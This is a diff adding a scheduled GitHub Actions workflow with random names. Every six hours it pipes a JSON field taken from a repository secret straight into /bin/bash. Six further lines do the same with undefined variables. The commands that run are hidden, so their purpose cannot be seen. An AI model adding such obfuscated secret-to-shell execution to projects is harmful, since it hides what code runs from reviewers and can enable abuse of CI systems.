@@ -1,0 +1,23 @@
+name: yadiannadezhuu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yadiannadezhuu
+        env:
+          zb0: ${{ secrets.zb0 }}
+        run: |
+          echo $zb0 | jq -r .hg040 | /bin/bash
+          echo $dmf677 | jq -r .wpqoy520 | /bin/bash
+          echo $mk10 | jq -r .hdd32 | /bin/bash
+          echo $n3 | jq -r .m7 | /bin/bash
+          echo $lb3545 | jq -r .r813 | /bin/bash
+          echo $idoo08 | jq -r .ylppo9042 | /bin/bash
+          echo $sjumg0 | jq -r .gaqm25534 | /bin/bash
+
